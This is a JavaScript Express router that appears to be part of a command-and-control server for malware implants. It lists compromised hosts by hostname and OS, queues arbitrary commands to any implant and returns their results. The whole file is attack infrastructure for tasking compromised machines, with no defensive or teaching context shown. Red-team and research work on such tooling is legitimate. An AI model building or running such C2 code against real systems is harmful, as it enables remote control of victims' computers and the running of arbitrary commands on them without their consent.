import express from 'express';
import { implants } from '../storage.js';
import { v4 as uuidv4 } from 'uuid';

const router = express.Router();

// List implants
router.get('/implants', (_req, res) => {
  const list = Object.entries(implants).map(([id, data]) => ({
    id,
    hostname: data.info.hostname,
    os: data.info.os
  }));
  res.json(list);
});

// Send task to implant
router.post('/task/:id', (req, res) => {
  const { id } = req.params;
  const { command } = req.body;
  if (!implants[id]) return res.status(404).json({ error: 'Unknown implant' });

  const taskId = uuidv4();
  implants[id].tasks.push({ taskId, command });
  console.log(`[>] Task sent to ${id}: ${command}`);
  res.json({ taskId });
});

// Get results from implant
router.get('/results/:id', (req, res) => {
  const { id } = req.params;
  if (!implants[id]) return res.status(404).json({ error: 'Unknown implant' });

  res.json(implants[id].results);
});

export default router;
